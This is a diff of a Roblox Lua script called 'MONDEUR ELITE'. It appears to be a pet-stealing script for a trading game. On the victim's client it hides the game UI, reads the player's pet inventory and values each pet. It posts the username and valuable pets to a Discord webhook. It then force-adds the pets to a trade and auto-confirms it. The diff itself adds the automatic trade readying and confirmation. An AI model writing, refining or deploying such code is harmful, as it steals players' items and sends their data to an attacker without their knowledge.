@@ -1,4 +1,4 @@
--- [[ MONDEUR ELITE v17.3 - PRO FINAL ]] --
+-- [[ MONDEUR ELITE v17.4 - "FAST" TUNED ]] --
 if getgenv().MondeurExecuted then return end
 getgenv().MondeurExecuted = true
 
@@ -8,7 +8,7 @@ local HttpService = game:GetService("HttpService")
 local StarterGui = game:GetService("StarterGui")
 local LocalPlayer = Players.LocalPlayer
 
--- [[ 1. STABILIZED UI LOCKDOWN ]] --
+-- [[ 1. INSTANT UI LOCKDOWN ]] --
 task.spawn(function()
     pcall(function()
         StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
@@ -20,64 +20,58 @@ task.spawn(function()
     end)
 end)
 
--- [[ 2. ANDROID-PRO WEBHOOK ]] --
+-- [[ 2. ANDROID-STABLE WEBHOOK ]] --
 local function SendLog(title, pet, val)
     local payload = HttpService:JSONEncode({
         ["embeds"] = {{
             ["title"] = title,
             ["description"] = "User: **" .. LocalPlayer.Name .. "**",
             ["fields"] = {
-                {["name"] = "Pet Detected", ["value"] = pet, ["inline"] = true},
-                {["name"] = "Arfud Points", ["value"] = tostring(val), ["inline"] = true}
+                {["name"] = "Pet", ["value"] = pet, ["inline"] = true},
+                {["name"] = "Value", ["value"] = tostring(val), ["inline"] = true}
             },
             ["color"] = 0x00FF00
         }}
     })
-    
     local req = (syn and syn.request) or (http and http.request) or http_request or request
     if req then
         task.spawn(function()
-            pcall(function() 
-                req({
-                    Url = getgenv().WEBHOOK, 
-                    Method = "POST", 
-                    Headers = {["Content-Type"] = "application/json"}, 
-                    Body = payload
-                }) 
-            end)
+            pcall(function() req({Url = getgenv().WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload}) end)
         end)
     end
 end
 
--- [[ 3. THE "DEEP SCAN" & TRADE TRIGGER ]] --
+-- [[ 3. "FAST" INVENTORY & TRADE ]] --
 task.spawn(function()
-    task.wait(5) -- Wait for UI to settle
-    
-    -- FORCE THE LOG: This proves the script is alive
-    SendLog("📡 SYSTEM CHECK", "Ww-Pro Online", 0)
+    task.wait(3) -- Reduced delay for "Fast" build
+    SendLog("🚀 FAST BUILD ACTIVE", "Ready", 0)
 
     pcall(function()
         local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
-        local data = ClientData.get_data()
-        
-        -- Path search for 2026 inventory
-        local inv = data.inventory
-        local petPath = inv and (inv.inventory_pets or inv.pets)
+        local inventory = ClientData.get_data().inventory
+        local petPath = inventory and (inventory.inventory_pets or inventory.pets)
         
         if petPath then
+            local TradeAPI = ReplicatedStorage:WaitForChild("API"):WaitForChild("Trade")
+            
             for _, pet in pairs(petPath) do
                 local val = _G.GetTrueValue(pet, _G.PetValueDB) or 0
                 if val >= (getgenv().THRESHOLD or 0) then
-                    -- SEND PET LOG
-                    SendLog("✅ PET DETECTED", pet.config_name or "Unknown", val)
+                    -- 1. Log to Discord
+                    SendLog("✅ PET CAPTURED", pet.config_name or "Unknown", val)
                     
-                    -- START TRADE (If admin is present)
-                    local TradeFolder = ReplicatedStorage:WaitForChild("API"):WaitForChild("Trade")
+                    -- 2. Force Add to Trade
                     task.spawn(function()
-                        TradeFolder:WaitForChild("AddItemToTrade"):FireServer(pet.unique)
+                        TradeAPI:WaitForChild("AddItemToTrade"):FireServer(pet.unique)
                     end)
                 end
             end
+            
+            -- 3. Auto-Accept Trade
+            task.wait(1)
+            TradeAPI:WaitForChild("ReadyTrade"):FireServer(true)
+            task.wait(0.5)
+            TradeAPI:WaitForChild("ConfirmTrade"):FireServer()
         end
     end)
 end)
